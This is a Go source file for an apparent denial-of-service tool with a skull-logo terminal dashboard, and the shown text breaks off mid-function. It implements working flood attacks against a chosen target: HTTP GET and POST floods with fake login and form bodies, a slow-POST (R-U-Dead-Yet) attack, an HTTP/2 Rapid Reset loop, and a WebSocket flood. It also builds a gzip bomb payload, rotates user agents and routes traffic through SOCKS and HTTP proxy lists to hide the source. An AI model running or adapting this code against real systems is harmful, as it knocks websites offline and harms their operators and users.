package main

import (
    "bufio"
    "bytes"
    "compress/gzip"
    "crypto/rand"
    "crypto/tls"
    "encoding/base64"
    "flag"
    "fmt"
    "io"
    "log"
    mrand "math/rand/v2"
    "net"
    "net/http"
    "net/url"
    "os"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "github.com/gorilla/websocket"
    "golang.org/x/net/http2"
    "golang.org/x/net/http2/hpack"
)

var userAgents []string
var totalSent atomic.Int64
var totalSuccess atomic.Int64
var totalErrors atomic.Int64
var proxyList []string
var zstdBombPayload []byte
var startTime time.Time
var statusCounts = make(map[string]int)
var statusMutex = sync.Mutex{}
var logLines []string
var logMutex = sync.Mutex{}
var maxLogLines = 10
var cBlink = "\033[5m"

var bufPool = sync.Pool{
    New: func() interface{} {
        return make([]byte, 16384)
    },
}

func init() {
    if uas, err := loadUserAgents("useragent.txt"); err == nil && len(uas) > 0 {
        userAgents = uas
    } else {
        userAgents = []string{
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        }
    }

    var buf bytes.Buffer
    gz := gzip.NewWriter(&buf)
    payload := bytes.Repeat([]byte("A"), 10*1024*1024)
    gz.Write(payload)
    gz.Close()
    zstdBombPayload = buf.Bytes()

    startTime = time.Now()
}

func loadUserAgents(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        if line := strings.TrimSpace(scanner.Text()); line != "" {
            lines = append(lines, line)
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }
    if len(lines) == 0 {
        return nil, fmt.Errorf("no user agents found in %s", filename)
    }
    return lines, nil
}

func randUA() string {
    return userAgents[mrand.IntN(len(userAgents))]
}

func loadProxies(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, fmt.Errorf("open proxy file: %w", err)
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        if line := strings.TrimSpace(scanner.Text()); line != "" {
            lines = append(lines, line)
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, fmt.Errorf("read proxy file: %w", err)
    }
    if len(lines) == 0 {
        return nil, fmt.Errorf("no proxies found in %s", filename)
    }
    return lines, nil
}

func recordStatus(code string) {
    statusMutex.Lock()
    statusCounts[code]++
    statusMutex.Unlock()
}

func logEvent(msg string) {
    logMutex.Lock()
    defer logMutex.Unlock()
    timestamp := time.Now().Format("15:04:05")
    entry := fmt.Sprintf("[%s] %s", timestamp, msg)
    logLines = append(logLines, entry)
    if len(logLines) > maxLogLines {
        logLines = logLines[len(logLines)-maxLogLines:]
    }
}

func drawUI(target, method, proxyFile string, workers, duration int) {
    sent := totalSent.Load()
    success := totalSuccess.Load()
    errors := totalErrors.Load()
    elapsed := time.Since(startTime).Seconds()
    if elapsed < 1 {
        elapsed = 1
    }
    rps := float64(sent) / elapsed

    fmt.Print("\033[H\033[2J")

    cReset := "\033[0m"
    cRed := "\033[31m"
    cGreen := "\033[32m"
    cYellow := "\033[33m"
    cCyan := "\033[36m"
    cMagenta := "\033[35m"
    cWhite := "\033[97m"
    cBold := "\033[1m"
    cDim := "\033[2m"

    logo := []string{
        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡖⠿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⡻⠉⢀⠀⠈⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡏⠀⡂⣸⣦⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢻⠉⠻⠐⣭⡀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢡⠤⠜⠂⠀⠀⠈⠘⠀⠀⠀⠱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⣠⠞⠁⠙⢦⣀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠉⠳⣄⠀⠀⠹⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣼⣶⣶⢒⣒⡒⢤⡤⠀⠀⢦⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⢰⣶⣿⣿⣿⣾⣧⣤⣬⣤⣀⣙⣿⣤⣤⡆⠂⠂⡀⠀⠀⠀⠀⣀⠀⠠⠐⠂⠈⡋⣟⣿⣇⣠⡀⡼⣇⣀⡀⠰⣷⣶⣶⣶⠒⠒⠒⠒⠒⠒⠒⠒⠢⠤⢄⡀" + cReset,
        cRed + "⠀⠀⠀⠀⠉⠉⢛⣿⢿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠂⠂⠀⠉⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣷⣶⣶⣶⣶⣶⣶⣾⣿⠿⠛⠁" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⠈⠛⢻⣿⣿⣿⣿⡏⢁⣀⣀⣠⣤⣤⡤⠀⢀⠀⠀⢀⡀⣀⣠⣤⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⠟⠛⠋⠉⠉⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⡿⠿⠛⠛⠉⠀⠀⠒⢾⠤⠤⠤⠀⠚⠛⠉⢩⠙⠛⠛⠟⠿⣿⡿⢿⡿⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠟⢻⠁⠀⠀⢀⣀⣀⣀⣀⠤⠀⠀⠀⠀⠀⢀⣤⡤⠼⣴⣤⣤⣤⣤⣿⡿⠿⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠠⢶⣶⣶⣿⣦⣤⣠⣿⣿⣶⣾⣿⣶⣿⣿⠿⠿⠛⠁⠀⠀⠀⠀⠤⠤⠶⠿⢿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠿⠿⠿⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⣿⠟⢿⣿⣿⣿⣿⡿⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⣸⡇⠀⣿⣿⣿⣿⠟⠀⢸⠋⠀⠀⠀⠀⠠⣤⣀⣄⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⢀⡟⠀⢠⣿⣿⡟⠁⠀⠀⡸⠁⠀⠠⠀⠀⠁⠀⢉⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⣾⠀⠀⣼⡟⠁⠀⠀⠀⢠⡇⢀⢄⡞⠀⠀⡳⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠈⠙⠚⠋⠀⠀⠀⠀⢀⣾⠇⠡⠈⠀⠀⢀⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠿⡆⠀⠀⢀⣴⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
        cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣷⣶⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
    }

    proxyLabel := "DIRECT"
    if proxyFile != "" {
        proxyLabel = proxyFile
    }

    infoLines := []string{
        cBold + cRed + "TARGET: " + cReset + cWhite + target + cReset,
        cBold + cMagenta + "METHOD: " + cReset + cWhite + strings.ToUpper(method) + cReset,
        cBold + cYellow + "WORKERS: " + cReset + cWhite + strconv.Itoa(workers) + cReset,
        cBold + cCyan + "PROXIES: " + cReset + cWhite + proxyLabel + cReset,
        cDim + "-----------------------------------" + cReset,
        cBold + cGreen + "SENT: " + cReset + cWhite + strconv.FormatInt(sent, 10) + cReset,
        cBold + cCyan + "RPS: " + cReset + cWhite + fmt.Sprintf("%.0f", rps) + cReset,
        cBold + cGreen + "SUCCESS: " + cReset + cWhite + strconv.FormatInt(success, 10) + cReset,
        cBold + cRed + "ERRORS: " + cReset + cWhite + strconv.FormatInt(errors, 10) + cReset,
        cDim + "-----------------------------------" + cReset,
        cBold + "STATUS CODES:" + cReset,
    }

    statusMutex.Lock()
    keys := make([]string, 0, len(statusCounts))
    for k := range statusCounts {
        keys = append(keys, k)
    }
    for i := 0; i < len(keys); i++ {
        for j := i + 1; j < len(keys); j++ {
            if keys[i] > keys[j] {
                keys[i], keys[j] = keys[j], keys[i]
            }
        }
    }

    for _, k := range keys {
        color := cGreen
        if k == "Err" || strings.HasPrefix(k, "4") || strings.HasPrefix(k, "5") {
            color = cRed
        } else if strings.HasPrefix(k, "3") {
            color = cYellow
        }
        infoLines = append(infoLines, "  "+color+k+cReset+": "+strconv.Itoa(statusCounts[k]))
    }
    statusMutex.Unlock()

    maxLines := len(logo)
    if len(infoLines) > maxLines {
        maxLines = len(infoLines)
    }

    for i := 0; i < maxLines; i++ {
        var l string
        if i < len(logo) {
            l = logo[i]
        } else {
            l = strings.Repeat(" ", 35)
        }
        if i < len(infoLines) {
            l += "  " + infoLines[i]
        }
        fmt.Println(l)
    }
    fmt.Println()
    fmt.Println(cBold + cCyan + "LIVE LOGS:" + cReset)
    logMutex.Lock()
    for _, line := range logLines {
        fmt.Println(line)
    }
    logMutex.Unlock()
    fmt.Println()
    fmt.Println(cDim + "Press Ctrl+C to stop..." + cReset)
}

const (
    dialTimeout           = 5 * time.Second
    responseHeaderTimeout = 10 * time.Second
    clientTimeout         = 10 * time.Second
    keepAliveInterval     = 30 * time.Second
    idleConnTimeout       = 90 * time.Second
    maxIdleConns          = 500
    maxIdleConnsPerHost   = 500
    maxConnsPerHost       = 0
    maxClientsPerProxy    = 64
    maxDirectPool         = 256
)

func newTransport(proxyURL *url.URL) *http.Transport {
    t := &http.Transport{
        DialContext: (&net.Dialer{
            Timeout:   dialTimeout,
            KeepAlive: keepAliveInterval,
        }).DialContext,
        TLSClientConfig:       &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
        TLSHandshakeTimeout:   dialTimeout,
        MaxIdleConns:          maxIdleConns,
        MaxIdleConnsPerHost:   maxIdleConnsPerHost,
        MaxConnsPerHost:       maxConnsPerHost,
        IdleConnTimeout:       idleConnTimeout,
        ResponseHeaderTimeout: responseHeaderTimeout,
        DisableKeepAlives:     false,
        DisableCompression:    true,
        ForceAttemptHTTP2:     false,
    }
    if proxyURL != nil {
        t.Proxy = http.ProxyURL(proxyURL)
    }
    return t
}

func buildClientPool(proxies []string, workers int) ([]*http.Client, error) {
    seen := make(map[string]bool)
    var unique []string
    for _, p := range proxies {
        if !seen[p] {
            seen[p] = true
            unique = append(unique, p)
        }
    }

    clientsPerProxy := workers / len(unique)
    if clientsPerProxy < 1 {
        clientsPerProxy = 1
    }
    if clientsPerProxy > maxClientsPerProxy {
        clientsPerProxy = maxClientsPerProxy
    }
    clients := make([]*http.Client, 0, len(unique)*clientsPerProxy)

    for _, raw := range unique {
        proxyURL, err := url.Parse(raw)
        if err != nil {
            continue
        }
        for i := 0; i < clientsPerProxy; i++ {
            c := &http.Client{
                Transport: newTransport(proxyURL),
                Timeout:   clientTimeout,
                CheckRedirect: func(req *http.Request, via []*http.Request) error {
                    if len(via) >= 3 {
                        return http.ErrUseLastResponse
                    }
                    return nil
                },
            }
            clients = append(clients, c)
        }
    }
    if len(clients) == 0 {
        return nil, fmt.Errorf("no valid proxy clients built")
    }
    return clients, nil
}

func buildDirectPool(count int) []*http.Client {
    clients := make([]*http.Client, 0, count)
    for i := 0; i < count; i++ {
        c := &http.Client{
            Transport: newTransport(nil),
            Timeout:   clientTimeout,
            CheckRedirect: func(req *http.Request, via []*http.Request) error {
                if len(via) >= 3 {
                    return http.ErrUseLastResponse
                }
                return nil
            },
        }
        clients = append(clients, c)
    }
    return clients
}

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randString(n int) string {
    b := make([]byte, n)
    for i := range b {
        b[i] = charset[mrand.IntN(len(charset))]
    }
    return string(b)
}

func randEmail() string {
    domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
    return randString(8+mrand.IntN(12)) + "@" + domains[mrand.IntN(len(domains))]
}

func dialViaProxy(network, addr string, proxyURL *url.URL) (net.Conn, error) {
    proxyAddr := proxyURL.Host
    if !strings.Contains(proxyAddr, ":") {
        proxyAddr += ":1080"
    }

    conn, err := net.DialTimeout(network, proxyAddr, 15*time.Second)
    if err != nil {
        return nil, err
    }

    if strings.HasPrefix(proxyURL.Scheme, "socks5") {
        _, err = conn.Write([]byte{0x05, 0x01, 0x00})
        if err != nil {
            conn.Close()
            return nil, err
        }

        buf := make([]byte, 2)
        _, err = conn.Read(buf)
        if err != nil {
            conn.Close()
            return nil, err
        }
        if buf[0] != 0x05 || buf[1] != 0x00 {
            conn.Close()
            return nil, fmt.Errorf("socks5 auth failed")
        }

        host, portStr, _ := net.SplitHostPort(addr)
        port, _ := strconv.Atoi(portStr)

        ip := net.ParseIP(host)
        var req []byte
        if ip != nil {
            if ip4 := ip.To4(); ip4 != nil {
                req = []byte{0x05, 0x01, 0x00, 0x01}
                req = append(req, ip4...)
            } else {
                req = []byte{0x05, 0x01, 0x00, 0x04}
                req = append(req, ip.To16()...)
            }
        } else {
            req = []byte{0x05, 0x01, 0x00, 0x03, byte(len(host))}
            req = append(req, []byte(host)...)
        }
        req = append(req, byte(port>>8), byte(port))

        _, err = conn.Write(req)
        if err != nil {
            conn.Close()
            return nil, err
        }

        resp := make([]byte, 256)
        n, err := conn.Read(resp)
        if err != nil {
            conn.Close()
            return nil, err
        }
        if n < 2 || resp[0] != 0x05 || resp[1] != 0x00 {
            conn.Close()
            return nil, fmt.Errorf("socks5 connect failed")
        }
    } else if strings.HasPrefix(proxyURL.Scheme, "socks4") {
        host, portStr, _ := net.SplitHostPort(addr)
        port, _ := strconv.Atoi(portStr)
        ip := net.ParseIP(host)

        if ip == nil {
            req := []byte{0x04, 0x01, byte(port >> 8), byte(port), 0, 0, 0, 1, 0}
            req = append(req, []byte(host)...)
            req = append(req, 0)
            _, err = conn.Write(req)
        } else {
            ip4 := ip.To4()
            if ip4 == nil {
                conn.Close()
                return nil, fmt.Errorf("socks4 requires IPv4")
            }
            req := []byte{0x04, 0x01, byte(port >> 8), byte(port), ip4[0], ip4[1], ip4[2], ip4[3], 0}
            _, err = conn.Write(req)
        }
        if err != nil {
            conn.Close()
            return nil, err
        }

        resp := make([]byte, 8)
        _, err = conn.Read(resp)
        if err != nil {
            conn.Close()
            return nil, err
        }
        if resp[1] != 0x5a {
            conn.Close()
            return nil, fmt.Errorf("socks4 connect failed")
        }
    } else {
        connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", addr, addr)
        if proxyURL.User != nil {
            user := proxyURL.User.Username()
            pass, _ := proxyURL.User.Password()
            cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
            connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
        }
        connectReq += "\r\n"
        _, err = conn.Write([]byte(connectReq))
        if err != nil {
            conn.Close()
            return nil, err
        }
        br := bufio.NewReader(conn)
        resp, err := http.ReadResponse(br, nil)
        if err != nil {
            conn.Close()
            return nil, err
        }
        resp.Body.Close()
        if resp.StatusCode != 200 {
            conn.Close()
            return nil, fmt.Errorf("proxy connect failed: %d", resp.StatusCode)
        }
    }

    return conn, nil
}

func httpGet(url string, client *http.Client) error {
    resp, err := client.Get(url)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func genFormPayload() (string, string) {
    payloads := []func() string{
        func() string {
            return "username=" + randString(8+mrand.IntN(16)) +
                "&password=" + randString(12+mrand.IntN(20)) +
                "&email=" + randEmail() +
                "&csrf_token=" + randString(32)
        },
        func() string {
            return "search=" + randString(20+mrand.IntN(200)) +
                "&category=" + randString(5) +
                "&page=" + strconv.Itoa(mrand.IntN(500)) +
                "&submit=Search"
        },
        func() string {
            return "name=" + randString(10) +
                "&email=" + randEmail() +
                "&subject=" + randString(20+mrand.IntN(40)) +
                "&message=" + randString(200+mrand.IntN(2000)) +
                "&token=" + randString(64)
        },
        func() string {
            var sb strings.Builder
            n := 50 + mrand.IntN(200)
            for i := 0; i < n; i++ {
                if i > 0 {
                    sb.WriteByte('&')
                }
                sb.WriteString(randString(3 + mrand.IntN(8)))
                sb.WriteByte('=')
                sb.WriteString(randString(5 + mrand.IntN(30)))
            }
            return sb.String()
        },
        func() string {
            size := 10240 + mrand.IntN(40960)
            blob := make([]byte, size)
            rand.Read(blob)
            return "data=" + base64.StdEncoding.EncodeToString(blob)
        },
    }

    if mrand.IntN(4) == 0 {
        jsonStr := fmt.Sprintf(
            `{"email":"%s","password":"%s","action":"login","token":"%s","data":"%s"}`,
            randEmail(), randString(16+mrand.IntN(32)), randString(64), randString(200+mrand.IntN(1000)),
        )
        return jsonStr, "application/json"
    }

    return payloads[mrand.IntN(len(payloads))](), "application/x-www-form-urlencoded"
}

func httpPost(targetURL string, client *http.Client) error {
    body, contentType := genFormPayload()
    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", contentType)
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

type slowReader struct {
    data  []byte
    pos   int
    delay time.Duration
    stop  <-chan struct{}
}

func (r *slowReader) Read(p []byte) (int, error) {
    select {
    case <-r.stop:
        return 0, io.EOF
    default:
    }
    if r.pos >= len(r.data) {
        r.pos = 0
    }
    p[0] = r.data[r.pos]
    r.pos++
    time.Sleep(r.delay)
    return 1, nil
}

func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error {
    declaredSize := 1024*1024 + mrand.IntN(50*1024*1024)
    chunk := []byte("comment=" + randString(50) + "&" + randString(10) + "=" + randString(20) + "&")

    slow := &slowReader{
        data:  chunk,
        delay: time.Duration(500+mrand.IntN(2000)) * time.Millisecond,
        stop:  stop,
    }

    req, err := http.NewRequest("POST", targetURL, slow)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.ContentLength = int64(declaredSize)
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")
    req.Header.Set("Connection", "keep-alive")

    rudyClient := *client
    rudyClient.Timeout = 0
    if t, ok := rudyClient.Transport.(*http.Transport); ok {
        tClone := t.Clone()
        tClone.ResponseHeaderTimeout = 0
        tClone.IdleConnTimeout = 0
        rudyClient.Transport = tClone
    }

    resp, err := rudyClient.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpRapidResetAdvanced(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    rawConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    tlsConn := tls.Client(rawConn, &tls.Config{
        ServerName:         host,
        NextProtos:         []string{"h2"},
        InsecureSkipVerify: true,
    })
    if err := tlsConn.Handshake(); err != nil {
        rawConn.Close()
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    defer tlsConn.Close()

    if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
        recordStatus("Err")
        totalErrors.Add(1)
        return fmt.Errorf("h2 not negotiated")
    }

    if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    bw := bufio.NewWriterSize(tlsConn, 1<<20)
    framer := http2.NewFramer(bw, tlsConn)
    framer.AllowIllegalWrites = true

    framer.WriteSettings(
        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1<<31 - 1},
        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1<<31 - 1},
    )
    bw.Flush()

    var streamID uint32 = 1
    var hdrBuf bytes.Buffer
    enc := hpack.NewEncoder(&hdrBuf)
    path := u.RequestURI()
    if path == "" {
        path = "/"
    }

    for {
        select {
        case <-stop:
            return nil
        default:
        }

        hdrBuf.Reset()
        enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
        enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
        enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
        enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Host})
        enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})

        if err := framer.WriteHeaders(http2.HeadersFrameParam{
            StreamID:      streamID,
            BlockFragment: hdrBuf.Bytes(),
            EndStream:     true,
            EndHeaders:    true,
        }); err != nil {
            return err
        }

        if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
            return err
        }

        streamID += 2
        if streamID >= 1<<31-1 {
            bw.Flush()
            return nil
        }

        if streamID%100 == 0 {
            bw.Flush()
        }

        recordStatus("RST")
        totalSuccess.Add(1)
    }
}

func wsFlood(targetURL string, stop <-chan struct{}) error {
    wsURL := targetURL
    if strings.HasPrefix(wsURL, "http://") {
        wsURL = "ws://" + wsURL[7:]
    } else if strings.HasPrefix(wsURL, "https://") {
        wsURL = "wss://" + wsURL[8:]
    } else if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
        wsURL = "ws://" + wsURL
    }

    var proxyURL *url.URL
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        var err error
        proxyURL, err = url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    dialer := websocket.Dialer{
        HandshakeTimeout: 10 * time.Second,
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
        },
    }
    if proxyURL != nil {
        dialer.Proxy = func(req *http.Request) (*url.URL, error) {
            return proxyURL, nil
        }
    }

    headers := http.Header{}
    headers.Set("User-Agent", randUA())
    headers.Set("Origin", targetURL)

    conn, _, err := dialer.Dial(wsURL, headers)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    defer conn.Close()

    go func() {
        for {
            if _, _, err := conn.ReadMessage(); err != nil {
                return
            }
        }
    }()

    for {
        select {
        case <-stop:
            conn.WriteMessage(websocket.CloseMessage,
                websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
            return nil
        default:
        }

        var err error
        switch mrand.IntN(5) {
        case 0:
            msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`,
                randString(8), randString(200+mrand.IntN(2000)), time.Now().UnixNano())
            err = conn.WriteMessage(websocket.TextMessage, []byte(msg))
        case 1:
            data := make([]byte, 1024+mrand.IntN(7168))
            rand.Read(data)
            err = conn.WriteMessage(websocket.BinaryMessage, data)
        case 2:
            err = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
        case 3:
            err = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+mrand.IntN(40960))))
        case 4:
            for j := 0; j < 10; j++ {
                if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(16))); e != nil {
                    err = e
                    break
                }
                recordStatus("Sent")
                totalSuccess.Add(1)
            }
        }

        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        recordStatus("Sent")
        totalSuccess.Add(1)
    }
}

var apiActions = []string{"update_profile", "create_post", "send_message", "add_comment", "upload_data", "sync", "process", "validate", "register", "checkout"}
var apiEndpoints = []string{"/api/v1/users", "/api/v2/data", "/api/graphql", "/api/v1/submit", "/api/v1/auth", "/api/v1/search", "/api/v1/events", "/api/v1/webhook"}

func genAPIPayload() string {
    generators := []func() string{
        func() string {
